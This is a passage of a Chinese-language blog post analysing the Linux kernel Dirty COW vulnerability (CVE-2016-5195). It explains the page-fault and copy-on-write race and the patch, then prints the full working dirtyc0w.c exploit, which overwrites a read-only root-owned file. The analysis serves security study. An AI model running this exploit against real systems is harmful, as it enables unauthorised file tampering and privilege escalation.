VM_FAULT_HWPOISON;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!(ret &amp; VM_FAULT_LOCKED)))<br>		lock_page(vmf.page);<br>	<span class="hljs-keyword">else</span><br>		VM_BUG_ON_PAGE(!PageLocked(vmf.page), vmf.page);<br><br> out:<br>	*page = vmf.page;<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="页缺失流程"><a href="#页缺失流程" class="headerlink" title="页缺失流程"></a>页缺失流程</h1><p>需要通过三次<code>follow_page_mask</code>以及两次<code>faultin_page</code>才能够正确返回物理页</p>
<ul>
<li>第一次<code>follow_page_mask</code>由于虚拟地址与物理页未完成映射所以会直接返回进入<code>faultin_page</code>完成缺页处理</li>
<li>第一次<code>faultin_page</code>会进入<code>do_cow_fault</code>完成写时复制，建立新页与虚拟地址的映射</li>
<li>第二次<code>follow_page_mask</code>，虽然页表已经与虚拟地址完成映射，但是<code>pte</code>项不具备写权限但是用户需要进行写的操作，因此会判定刚刚完成映射的物理页不符合用户的请求，因此返回<code>NULL</code></li>
<li>第二次<code>faultin_page</code>则是将需要写物理页的标志位给清除</li>
<li>第三次<code>follow_page_mask</code>，发现页表项已经完成映射，并且符合用户的请求直接将映射后的物理页返回给用户</li>
</ul>
<h2 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h2><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091155834.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<h2 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h2><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091155369.png" srcset="/img/loading.gif" lazyload alt="2"></p>
<h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091150792.png" srcset="/img/loading.gif" lazyload alt="3"></p>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>可以看到补丁增加了写诗复制的标志位，而且不会将<code>FOLL_WRITE</code>标志进行清空，而是或上写诗复制的标志位。</p>
<p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101175601751.png" srcset="/img/loading.gif" lazyload alt="image-20230101175601751"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>脏牛漏洞利用写诗复制的特性，利用条件竞争漏洞去删除用于判断写诗复制的关键标志位，从而诱导内核出错。并且由于利用简单，影响力巨大。后续出现的脏管道漏洞也是因为与脏牛漏洞类型得以命名。</p>
<h1 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">####################### dirtyc0w.c #######################</span><br><span class="hljs-comment">$ sudo -s</span><br><span class="hljs-comment"># echo this is not a test &gt; foo</span><br><span class="hljs-comment"># chmod 0404 foo</span><br><span class="hljs-comment">$ ls -lah foo</span><br><span class="hljs-comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span><br><span class="hljs-comment">$ cat foo</span><br><span class="hljs-comment">this is not a test</span><br><span class="hljs-comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="hljs-comment">$ ./dirtyc0w foo m00000000000000000</span><br><span class="hljs-comment">mmap 56123000</span><br><span class="hljs-comment">madvise 0</span><br><span class="hljs-comment">procselfmem 1800000000</span><br><span class="hljs-comment">$ cat foo</span><br><span class="hljs-comment">m00000000000000000</span><br><span class="hljs-comment">####################### dirtyc0w.c #######################</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-built_in">map</span>;<br><span class="hljs-type">int</span> f;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">char</span> *name;<br> <br><span class="hljs-type">void</span> *<span class="hljs-title function_">madviseThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++)<br>  &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span><br><span class="hljs-comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span><br><span class="hljs-comment">&gt; while having the page of the executable mmapped in memory.</span><br><span class="hljs-comment">*/</span><br>    c+=madvise(<span class="hljs-built_in">map</span>,<span class="hljs-number">100</span>,MADV_DONTNEED);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;madvise %d\n\n&quot;</span>,c);<br>&#125;<br> <br><span class="hljs-type">void</span> *<span class="hljs-title function_">procselfmemThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span><br><span class="hljs-comment">&gt;  The in the wild exploit we are aware of doesn&#x27;t work on Red Hat</span><br><span class="hljs-comment">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span><br><span class="hljs-comment">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span><br><span class="hljs-comment">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-type">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>,O_RDWR);<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to reset the file pointer to the memory position.</span><br><span class="hljs-comment">*/</span><br>    lseek(f,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>,SEEK_SET);<br>    c+=write(f,str,<span class="hljs-built_in">strlen</span>(str));<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;procselfmem %d\n\n&quot;</span>, c);<br>&#125;<br> <br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to pass two arguments. File and Contents.</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">if</span> (argc&lt;<span class="hljs-number">3</span>) &#123;<br>  (<span class="hljs-type">void</span>)<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,<br>      <span class="hljs-string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-type">pthread_t</span> pth1,pth2;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to open the file in read only mode.</span><br><span class="hljs-comment">*/</span><br>  f=open(argv[<span class="hljs-number">1</span>],O_RDONLY);<br>  fstat(f,&amp;st);<br>  name=argv[<span class="hljs-number">1</span>];<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span><br><span class="hljs-comment">&gt; Create a private copy-on-write mapping.  Updates to the</span><br><span class="hljs-comment">&gt; mapping are not visible to other processes mapping the same</span><br><span class="hljs-comment">&gt; file, and are not carried through to the underlying file.  It</span><br><span class="hljs-comment">&gt; is unspecified whether changes made to the file after the</span><br><span class="hljs-comment">&gt; mmap() call are visible in the mapped region.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to open with PROT_READ.</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmap %zx\n\n&quot;</span>,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to do it on two threads.</span><br><span class="hljs-comment">*/</span><br>  pthread_create(&amp;pth1,<span class="hljs-literal">NULL</span>,madviseThread,argv[<span class="hljs-number">1</span>]);<br>  pthread_create(&amp;pth2,<span class="hljs-literal">NULL</span>,procselfmemThread,argv[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to wait for the threads to finish.</span><br><span class="hljs-comment">*/</span><br>  pthread_join(pth1,<span class="hljs-literal">NULL</span>);<br>  pthread_join(pth2,<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266033.htm">https://bbs.pediy.com/thread-266033.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CVE-2016-5195/">#CVE-2016-5195</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2016-5195-Dirtycow</div>
      <div>http://example.com/2023/06/27/CVE-2016-5195-DirtyCow/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>hope</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年6月27日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/06/27/CVE-2021-4034-Pkexec/" title="CVE-2021-4034-Pkexec数组越界">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2021-4034-Pkexec数组越界</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/06/27/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E8%BF%90%E7%94%A8%E6%89%8B%E6%9C%BA%E5%A4%9A%E5%AA%92%E4%BD%93/" title="Android第一行代码--多媒体">
                        <span class="hidden-mobile">Android第一行代码--多媒体</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
